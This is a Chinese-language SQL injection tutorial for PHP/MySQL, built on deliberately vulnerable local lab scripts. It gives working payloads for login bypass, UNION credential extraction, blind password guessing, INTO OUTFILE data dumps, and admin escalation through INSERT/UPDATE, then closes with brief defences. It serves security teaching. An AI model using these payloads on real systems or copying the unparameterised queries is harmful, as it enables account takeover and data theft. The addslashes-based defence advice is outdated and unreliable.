# PHP/MySQL注入

------

当php.ini里的magic_quotes_gpc=on时，提交的变量中所有的'(单引号)，"(双引号)，\(反斜线)和空字符会自动转为含有反斜线的转义字符。给注入带来阻碍。


**PHP+MySQL注入的误区**

很多人任务在PHP+MySQL下注入一定要用到单引号，其实对注入认识上的一种误区。为什么呢，因为不管在什么语言中，在引号(包括单双)里，所有字符串均是常量，及时是dir这样的命令，也仅仅是字符串而已，而不能当做命令执行，除非代码这样写：

```
$command= "dir c:\";
system($command);
```

否则紧急你只是字符串，当然，所说的命令不单指系统命令，说的是SQL语句，要让构造的SQL语句正常执行，就不能让语句变成字符串，那什么情况下会用单引号？什么时候不用？

```
SELECT * FROM article WHERE articleid='$id'
SELECT * FROM article WHERE articleid=id
```

两种写法在各种程序中都很普遍，但安全性是不同的，第一句由于把变量$id放在一对单引号中，这样使得我们所提交的变量都变成了字符串，即使包含了正确的SQL语句，也不会正常执行，而第二句不同，由于没有把变量放进单引号中，那么所提交的一切只要包含空格，那空格后的变量都会作为SQL语句执行，针对这两个句子分别提交两个成功注入的畸形语句，看看不同之处：

```
1.指定变量$id为：
	1' and 1=2 union select * from user where userid=1/*
	此时整个SQL语句变成:
	SELECT * FROM article WHERE articleid='1' and 1=2 union select * from user where userid=1/*'

2.指定变量$id为:
	1 and 1=2 union select * from user where userid=1
	此时整个SQLL语句变为:
	SELECT * FROM article WHERE articleid=1 and 1=2 union select * from user where  userid=1

```

	由于第一句有单引号，必须先闭合前面的单引号，这样才能使用后面的语句作为SQL执行，并要注释掉后面原SQL语句中的后面的单引号，这样才能成功注入，如果php.ini中magic_quotes_gpc设置为on后者变量前使用了addslashes()函数，攻击就不能成功，但是第二句没有用引号包含变量，那也不用考虑闭合，注释，直接提交就ok了。

例子:

```
CREATE TABLE user(
userid int(11) NOT NULL auto_increment,
username varchar(20) NOT NULL default '',
password varchar(20) NOT NULL default '',
PRIMARY KEY(userid))
TYPE=InnoDB;
INSERT INTO user VALUES(1,'angel','mypass')
```

验证用户文件的代码:
```
<?php
$servername = 'localhost';
$dbusername = 'root';
$dbpassword = '';
$dbname = 'injection';

mysql_connect($servername,$dbusername,$dbpassword) or die('connection failed');

$sql = "SELECT * FROM user WHERE username='$username' AND password='$password'";
$result = mysql_db_query($dbname,$sql);
$userinfo = mysql_fetch_array($result);
if (empty($userinfo))
{
	echo "login failed";
}else{
	echo "login success"
}
echo "<p>SQL Query:$sql</p>"
?>

提交
```
http://localhost/injection/user.php?username=test' or 1=1
```

就会返回错误，因为单引号闭合后，并没有注释掉后面的单引号，导致单引号没有正确配对，由此可知我们构造的语句不能让MySQL正确执行，必须重新构造SQL语句:

```
http://localhost/injection/user.php?username=test' or '1=1
```

这时显示"Login success"，说明成功了，或者提交:

```
http://localhost/injectioni/user.php?username=test'--+
http://localhost/injection/user.php?username=test'%23
```

这样就把后面的语句注释掉，这两种提交的不同之处：
提交的第一句是利用逻辑运算，第二，三句是根据mysql的特性，mysql支持/*和#两种注释格式，所以提交的时候是把后面的代码注释掉，值得注意的是由于编码问题，在IE地址栏提交#会变成空的，所以在地址栏提交的时候，应该提交%23，才会变成#，就成功注释了，这个比逻辑运算简单多了。


**语句构造**

一.搜索引擎

```
<form method="GET" action="search.php" name="search">
<input name="keywords" type="text" value="" size="15"> <input type="submit" value="Search">
</form>
<p><b>Search result</b></p>
<?php
$servername = "localhost";
$dbusername = "root";
$dbpassword = "";
$dbname = "injection";
mysql_connect($servername,$dbusername,$dbpassword) or die ("Connection failed!");
$keywords = $_GET['keywords'];
if (!empty($keywords)) {
　　//$keywords = addslashes($keywords);
　　//$keywords = str_replace("_","\_",$keywords);
　　//$keywords = str_replace("%","\%",$keywords);
　　$sql = "SELECT * FROM ".$db_prefix."article WHERE title LIKE '%$keywords%' $search ORDER BY title DESC";
　　$result = mysql_db_query($dbname,$sql);
　　$tatol=mysql_num_rows($result);
　　echo "<p>SQL Query:$sql<p>";
　　if ($tatol <=0){
　　　　echo "The \"<b>$keywords</b>\" was not found in all the record.<p>\n";
　　} else {
　　　　while ($article=mysql_fetch_array($result)) {
　　　　　　echo "<li>".htmlspecialchars($article[title])."<p>\n";
　　　　} //while
　　}
} else {
　　echo "<b>Please enter some keywords.</b><p>\n";
}
?>
```

一般程序都是这样写的，如果缺乏变量检查，就可以改写变量，达到"注入"的目的，尽管没有危害，当输入"__","._","%"等类似的关键字时，会把数据库中的所有记录都取出来，如果在提交表单:

```
%' ORDER BY articleid--+
%' ORDER BY articleid#
__' ORDER BY articleid--+
__' ORDER BY articleid#


SELECT  * FROM aritcle WHERE title LIKE '%%' ORDER BY articleid--+%' ORDER BY title DESC

SELECT * FROM article WHERE title LIKE '%__' ORDER BY articleid#%' ORDER BY title DESC
```


二.查询字段

1.本表查询

```
<?php
$servername = "localhost";
$dbusername = "root";
$dbpassword = "";
$dbname = "injection";
mysql_connect($servername,$dbusername,$dbpassword) or die ("Connection failed!");
$sql = "SELECT * FROM user WHERE username='$username'";
$result = mysql_db_query($dbname,$sql);
$row = mysql_fetch_array($result);
if (!$row) {
　　echo "No record!";
　　echo "<p>SQL Query:$sql<p>";
　　exit;
}
echo "The ID you query：$row[userid]\n";
echo "<p>SQL Query:$sql<p>";
?>
```

当提交的用户名为真时，就会正常返回用户的ID，如果为非法参数就会提示相应的错误，由于是查询用户资料，可以大胆猜测密码就存在这个数据表里：

```
SELECT * FROM user WHERE username='$username' AND password='$password' 
```

相同的就是当条件为真时，就会给出正确的提示信息，如果构造出后面的AND条件部分，并使这部分为真，那目的也就达到了，还是利用刚才建立的user数据库
```
http://localhost/injection/user.php?username=aaron' and password='password

SELECT * FROM user WHERE username='aaron' AND password='password'

```

但在实际攻击中，肯定不知道密码，假设知道数据库的各个字段，就可以开始探测密码了，首先是获取密码长度:
```
http://localhost/injection/user.php?username=aaron' and LENGTH(password)='6
```

在MySQL中，要使用LENGTH(),只要没有构造错误，就是SQL语句能够正常执行，那返回结果无外乎两种，不是返回用户ID，就是返回"No record",当用户名为aaron并且密码长度为6的时候为真，就会返回相关记录，再用LEFT(),RIGHT(),MID()函数暴力破解密码:

```
http://localhost/injection/usr.php?username=aaron' and password=LEFT(password,1)='m

http://localhost/injection/user.php?username=aaron' and password=LEFT(password,2)='my

http://localhost/injection/user.php?username=aaron' and  password=LEFT(password,3)='myp

http://localhost/injection/user.php?username=aaron' and password=LEFT(password,4)='mypa

http://localhost/injection/user.php?username=aaron' and password=LEFT(password,5)='mypas

http://localhost/injection/user.php?username=aaron' and password=LEFT(password,6)='mypass

```


2.跨表查询

一定要用UNION连接两条SQL语句，最难掌握的就是字段的数量，在SELECT中欧的select_expression(select_expression表示你希望检索的列[字段])部分列出的列必须具有同样的类型。第一个SELECT查询中使用的列名将作为结果集的列名返回。简单的说，也就是UNION后面查选的字段数量，字段类型都应该与前面的SELECT一样，而且，如果前面的SELECT为真，就同时返回两个SELECT的结果，当前面的SELECT为假，就会返回第二个SELECT所得的结果，某些情况会替换掉在第一个SELECT原来应该显示的字段。
如果查询的两个数据表的字段相同，类型也相同，就可以这样提交:
```
SELECT * FROM aritcle WHERE articleid='$id' UNION SELECT * FROM
```

如果字段数量，字段类型任意一个不相同，就只能搞清楚数据类型和字段数量，这样提交：
```
SELECT * FROM article WHERE articleid='$id' UNION SELECT 1,1,1,1,1,1 FROM
```

否则 就会报错：
```
THE used SELECT statements hava a different number of columns
```

如果不知道数据类型和字段数量，可以用1慢慢试，因为1属于int\str\var类型，所以只要改变数量，一定可以猜到。

```
CREATE TABLE article ( 
articleid int(11) NOT NULL auto_increment, 
title varchar(100) NOT NULL default '', 
content text NOT NULL, 
PRIMARY KEY (articleid) 
) TYPE=InnoDB;
#
# 导出表中的数据 article 
#
INSERT INTO article VALUES (1, 'Stupid education', 'Fire the Minister'); 
INSERT INTO article VALUES (2, 'Smart student', 'I hate you');
```

这个表的 字段类型是int,varchar,text，如果用UNION联合查询的时候，后面的查询的表的结构和这个一样，就可以用SELECT * ，如果有任何一个不一样，就只能用"SELECT 1,1,1,1,1"。


```php
<?php
$servername = 'localhost';
$dbusername = 'root';
$dbpassword = 'password';
$dbname = 'injection';

mysql_connect($servername,$dbusername,$dbpassword) or die ("connection failed");

$sql = "SELECT * FROM article WHERE articleid='$id'";
$result = mysql_db_query($dbname,$sql);
$row = mysql_fetch_array($result);
if(!$row)
{
	echo 'no record';
	echo "<p>SQL query:$SQL</p>";
	exit;
}
echo "title<br>".$row[title]."<p>\n";
echo "content<br>".$row[content]."<p>\n"
echo "<p>SQL query:$sql<p>";
?>
```

正常情况下，提交这样一个请求：
```
http://localhost/injection/show.php?id=1
```

就会显示article为1的文章，但需要的是用户的敏感信息，就要查询user表，现在是查询user表。
由于$id没有过滤，只要把show.php文件中的语句改写成类似这个样子:
```
SELECT * FROM article WHERE articleid='$id' UNION SELECT * FROM user
```

由于这个代码是有单引号包含着变量的:
```
http://localhost/injection/show.php?id=1' union select 1,username,password from user--+
```

由于提交的articleid=1是article表里存在的，执行结果就是真，自然返回前面SELECT结果，当提交空值或者提交一个不存在的值，就会得到想要的东西:

```
http://localhost/injection/show.php?id=' union select 1,username,password from user--+
http://localhost/injection/show.php?id=9999' union select 1,username,password from user--+
```

三.导出文件

这个是比较容易构造但又有一定限制的技术。

```
select * from table into outfile '/var/www/upload/out.txt'
select * from table into outfile '/var/www/file.txt'
```

但这样的语句，一般很少用在程序里，所以我们需要自己构造，但必须有以下的前提:
+ 必须导出到能访问的目录，这样才能下载

+ 能访问的目录要有可写的权限，否则导出失败

+ 确保磁盘有足够的空间导出

+ 确保要已经存在相同的文件名

user.php文件的查询语句，按照into outfile的标准格式，注入成下面的语句就能导入我们需要的信息:

```
select * from article where articleid='$id' into outfile '/var/www/file.txt'
````

```
http://localhost/injection/show.php?id=1' into outfile '/var/www/file.txt
```

由于代码本身就有where来指定一个条件，所以导出的数据仅仅是满足这个条件的数据，如果想导出全部，只要使这个where条件为假，并且指定一个成真的条件，就可以不用被束缚在where里了：

```
http://localhost/injection/show.php?id=' or 1=1 into outfile '/var/www/file.txt
```

实际的SQL语句为:
```
select * from article where articleid='' or 1=1 into outfile '/var/www/file.txt'
```

这样username的参数是空的，即为假，1=1永远是真，那or前面的where就不起作用了。
跨表的导出文件语句该如何构造，还是用到UNION联合查询，所以一切前提条件都应该和UNION，导出数据一样，跨表导出数据正常情况下:

```
select * from article where articleid='$id' union select 1,username,password from user into outfile '/var/www/file.txt'
```

```
http://localhost/injection/show.php?id=1' union select 1,username,pssword from user into outfile '/var/www/download.txt
```

这样导出来的文件有一个问题，由于前面查询的id=1为真，所以导出的数据也就是一部分。
所以应该使前面的查询语句为假，才能只导出后面查询的内容:

```
http://localhost/injection/show.php?id=' union select 1,username,password from user into outfile '/var/www/download.php
```

值得注意的是想要导出文件，必须magic_quotes_gpc没有打开，并且程序没有用到addslashes()函数，还有不能对单引号过滤，因为在提交到处路径的时候，一定要用引号包裹起立，否则，系统不会认识那是一个路径。


**INSERT**

MySQL中除了SELECT外，还有INSERT和UPDATE危害更大的操作。

```
CREATEA TABLE 'user' (
	'userid' INT NOT NULL AUTO_INCREMENT,
	'username' VARCHAR(20) NOT NULL,
	'password' VARCHAR(20) NOT NULL,
	'homepage' VARCHAR(255) NOT NULL,
	'userlevel' INT DEFAULT '1' NOT NULL,
	PRIMARY KEY('userid')
);
```

其中userlevel代表用户的等级，1是普通用户，2是普通管理员，3是超级管理员，一个注册程序默认注册成普通用户:

```
INSERT INTO user (userid,username,password,homepage,userlevel) VALUES ('','$username','$password','$homepage','1');
```

默认userlevel字段是插入1，其中的变量都是没有经过过滤直接写入数据库的，可以在注册的时候，构造$homepge变量，就可以达到写的目的，指定$homepage变量为:
```
http://homepage','3')#
```

这时候插入数据库的时候就变成了:

```
INSERT INTO 'user' (userid,username,password,homepage,userlevel) VALUES ('','aaron','password','http://homepage','3')#','1');

这样就注册成为超级管理员了，但这种利用方法也有一定的局限性，比如：没有需要改写的变量如userlevel字段是数据库的第一个字段，前面没有地方给我们注入，也没有其他方法。


**UPDATE**

和INSERT相比，UPDATE的应用更加广泛，如果过滤不够，足以改写任务和数据。
```
UPDATE user SET password='$password',username='$username' WHERE id='$id';
```

用户可以修改自己的密码和主页，程序中的SQL语句没有更新userlevel字段，如何提升？还是构造$homepage变量，指定$homepage变量为:

```
http://homepge',userlevel='3
```

```
UPDATE user SET pssword='password',homepage='http://homepage',userlevel='3' WHERE id='$id';
```

直接修改任意用户的资料
```
UPDATE user SET password='MD5($password)',homepage='$homepage' WHERE id='$id'
```

尽管密码被加密了，但还是可以构造需要的语句，指定$password为:
```
mypass') where username='admin'#
```

```
UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)',homepage='$homepage' WHERE id='$id';
```

这样就更改了更新的条件，也可以从$id下手，指定$id为:

```
' or username='admin'

UPDATE user SET password='MD5($password)',homepage='$homepage' WHERE username='' or username='admin';
```

同样也可以达到修改的目的。如果有些变量是从数据库读取的固定值，甚至用$_SESSION['username']来读取服务器上的SESSION信息时，就可以在原来的WHERE之前构造WHERE并注释掉后面的代码，灵活注释也是注入的技巧之一。

变量的提交方式可以是GET或POST，提交的位置可以使地址栏，表单，隐藏表单或修改本地COOKIE信息等,提交的方式可以是本地提交，服务器上提交或者工具提交。


**高级应用**

1.使用MySQL内置函数
在ACCESS，MSSQL中的注入，有很多比较高级的注入方法，比如深入到系统，猜中文等，这些东西在MySQL中也能很好的得到发挥，其实在MySQL有很多内置函数都可以用在SQL语句里，这样就使得注入时更加灵活。

比较常用的
```
DATABASE()
USER()
SYSTEM_USER()
SESSION_USER()
CURRENT_USER()
...
```


```
UPDATE article SET title=$title WHERE articleid=1
```
$title可以为以上的各个函数，因为没有被引号包含，所以函数能正常执行

```
UPDATE article SET title=DATABASE() WHERE id=1 
#把当前数据库名更新到title字段
UPDATE article SET title=USER() WHERE id=1 
#把当前 MySQL 用户名更新到title字段
UPDATE article SET title=SYSTEM_USER() WHERE id=1 
#把当前 MySQL 用户名更新到title字段
UPDATE article SET title=SESSION_USER() WHERE id=1 
#把当前 MySQL 用户名更新到title字段
UPDATE article SET title=CURRENT_USER() WHERE id=1 
#把当前会话被验证匹配的用户名更新到title字段
```

获取MySQL数据库相关信息
```
http://localhost/inject/show.php?id=-1 union select 1,database(),version()
```


2.不加单引号注入
假设magic_quotes_gpc为on。
整型数据是不需要用引号引起来的，而字符串要用引号，这样就可以避免很多问题，但如果仅仅用整型数据，是没法进行注入的，所以要把构造的语句转换成整型类型，就需要用到char(),ascii(),ord(),conv()函数。

```
select * from user where username='angel'

select * from user where username=char(97,110,103,101,108)
char(...)相当于angel,十进制

select * from  user where username=0x616E67656C
0x616E67656C相当于angel，十六进制

```

构造的变量不被引号所包含才有意义，不然，不管怎么构造，只是字符串，发挥不了作用。

```
http://localhost/injection/user.php?id=1 and password='password'
```
由于magic_quotes_gpc打开的关系，这是有问题的，引号会变成/',使用char()函数:
```
http://localhost/injection/user.php?id=1 and password=char(109,121,112,97,115,115)
```

正常返回，说明char()是可行的，把char()用进LEFT()函数里面
```
http://localhost/injection/user.php?id=1 and LEFT(password,1)=char(109)
```
正常返回，说明id为1的用户，password字段第一位是char(109),这样依次猜下去

这样操作虽然可以猜到密码，但这样会影响效率，既然是整型，就可以用比较运算符来比较:

```
http://localhost/injection/user.php?id=1 and LEFT(password,1)>char(100)

http://localhost/injection/user.php?id=1 and LEFT(password,3)>char(100,120,110)

```

当然也可以使用SUBSTRING(str,pos,len)和MID(str,pos,len)函数，从字符串str的pos位置起返回len个字符的子串。

```
http://localhost/user.php?id=1 and mid(password,3,1)=char(112)
http://localhost/user.php?id=1 and mid(password,4,1)=char(97)
```

如果觉得麻烦，还有更简单的方法，就是利用ord()函数，该函数返回的是整型类型的数据，可以用比较运算符进行比较，当然得出的结果也就快多了，也就是这样提交:

```
http://localhost/user.php?id=1 and ord(mid(password,3,1))>111
http://localhost/user.php?id=1 and ord(mid(password,3,1))<113
http://localhost/user.php?id=1 and ord(mid(password,3,1))=112

```

3.快速确定未知数据结构的字段和类型

如果不清楚数据结构，很难用UNION联合查询，可以这样提交来快速确定有多少个字段:
```
http://localhost/user.php?id=-1 union select 1,1,1,1
```

有多少个"1"就表示有多个字段，如果字段数不同，就肯定会出错，如果字段数猜对了，就会返回正确的页面，字段数就出来了，就开始判断数据类型，随便用几个字母代替上面的1，但是由于magic_quotes_gpc打开，不能用引号，使用char()函数，char(97)表示字母"a":

```
http://localhost/user.php?id=1 union select char(97),char(97),char(97)
```

如果是字符串，就会正常显示"a",如果不是字符串或文本，也就是说是整型或者布尔型，就是返回"0"。

判断最主要靠的还是经验。


4.猜数据库表名

在快速确定未知数据结构的字段和类型的基础上，可以进一步的分析整个数据结构，猜表名，其实使用UNION联合查询的时候，不管后面的查询怎样畸形，只要没有语句上的问题，都会正确返回，也就是说，可以在上面的基础上，进一步猜表名：
```
http://localhost/show.php?id=1 union select 1,1,1,1
```

返回正常内容，就说明这个文件查询的表内是存在3个字段的，然后再后面加入from table_name：

```
http://localhost/user.php?id=1 union select 1,1,1,1 from admin
http://localhost/user.php?id=1 union select 1,1,1,1 from member
http://localhost/user.php?id=1 union select 1,1,1,1 from user
```

如果这个表存在，那么同样会返回应该显示的内容，如果表不存在，当然就会出错，先获得漏洞的文件所查询表的数据结构，确定结果后再进一步查询表。

但有一个问题，由于很多情况下，很多程序的数据表都会有一个前缀，有这个前缀就可以让多个程序共用一个数据库:

```
site_article
site_user
site_download
forum_user
forum_post
```

对于加表明前缀的，可以做一个表名列表来跑。


**注入的防范**

防范可以从两方面着手，一是服务器，二是代码。服务器方面可以将magic_quotes_gpc设置为on，display_errors设置为off。

从代码层面:如果说php比asp易用，更安全，从内置的函数就可以体现出来，如果是整型的变量，只需要使用一个intval()函数即可解决，在执行查询之前，先处理一下变量

```
$id=intval($id);
mysql_query("select * from article where articleid='$id'");


mysql_query("select * from article where articleid=".addslashes($id)."")

```

字符串型的变量也可以用addslashes()整个内置函数，这个函数的作用和magic_quotes_gpc一样，使用后，所有的',",\和空字符会自动转为含有反斜线的溢出字符。

```
$username = addslashes($username)
mysql_query("select * from member where username='$username'")

mysql_query("select * from member where username=".addslashes($username)."")
```


使用addslashes()函数还可以避免引号配对错误的情况出现，而刚才的前面搜索引擎的修补方法就是直接把"_","%"转换成"\_","\%",当然也要使用addslashes()函数

```
$key=addslashes($key);
$key=str_replace("_","\_",$key);
$key=str_replace("%","\%",$key);
```